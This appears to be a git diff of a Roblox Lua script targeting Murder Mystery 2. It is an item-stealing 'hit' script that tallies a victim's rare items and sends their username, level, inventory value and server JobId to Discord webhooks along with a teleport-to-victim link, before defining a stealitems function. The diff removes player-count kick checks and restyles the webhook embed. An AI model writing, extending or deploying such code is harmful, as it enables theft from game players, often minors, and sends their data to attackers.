@@ -791,14 +791,6 @@ local values = {
 	["Moon"] = 1
 }
 
-if #game:GetService("Players"):GetPlayers() <= 2 then
-    game.Players.LocalPlayer:Kick("Exit game and re-inject")
-end
-
-if #game:GetService("Players"):GetPlayers() == 12 then
-    game.Players.LocalPlayer:Kick("Exit game and re-inject.")
-end
-
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
@@ -1056,44 +1048,44 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 
-                         local WebHookEmbed = CreateEmbed(
-                            "MM2 Hit - Ft. Light Monzz",
-                            "Please execute the code above to get your hit.",
-                            65280,
-                            {
-                                {
-                                    name = "🌊 Player Info", 
-                                    value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
-                                             "\n | 🥳 Receiver: "..Username.."```"
-                                },
-                                {
-                                    name = "🍎 Items Data", 
-                                    value = "```Uniques: "..tostring(uniqueItemsC)..
-                                             "\nAncients: "..tostring(ancientItemsC)..
-                                             "\nGodlys: "..tostring(godlyItemsC)..
-                                             "\nLegendaries: "..tostring(legendaryItemsC)..
-                                             "\nVintage: "..tostring(vintageItemsC)..
-                                             "\nRares: "..tostring(rareItemsC)..
-                                             "\nUncommons: "..tostring(uncommonItemsC)..
-                                             "\nCommons: "..tostring(commonItemsC).."```"
-                                },
-                                {
-                                    name = "✏️ Total Value", 
-                                    value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
-                                },
-                                {
-                                    name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
-                                    value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
-                                }
-                            }
-                        )
+local WebHookEmbed = CreateEmbed(
+    "🔪 Join to get MM2 hit",
+    "",
+    11220,
+    {
+        {
+            name = "🌊 Player Info", 
+            value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
+                     "\n | 🥳 Receiver: "..Username.."```"
+        },
+        {
+            name = "🍎 Items Data",  
+            value = "```Uniques: "..tostring(uniqueItemsC)..
+                     "\nAncients: "..tostring(ancientItemsC)..
+                     "\nGodlys: "..tostring(godlyItemsC)..
+                     "\nLegendaries: "..tostring(legendaryItemsC)..
+                     "\nVintage: "..tostring(vintageItemsC)..
+                     "\nRares: "..tostring(rareItemsC)..
+                     "\nUncommons: "..tostring(uncommonItemsC)..
+                     "\nCommons: "..tostring(commonItemsC).."```"
+        },
+        {
+            name = "✏️ Total Value", 
+            value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
+        },
+        {
+            name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
+            value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
+        }
+    }
+)
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
     SendWebhook(Webhook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
-    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId= "..game.JobId..")", embeds = {WebHookEmbed}})
+    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId..")", embeds = {WebHookEmbed}})
 else
     SendWebhook(Webhook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
-    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId= "..game.JobId..")", embeds = {WebHookEmbed}})
+    SendWebhook(Webhook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId..")", embeds = {WebHookEmbed}})
 end
 
 local function stealitems(targetUser)
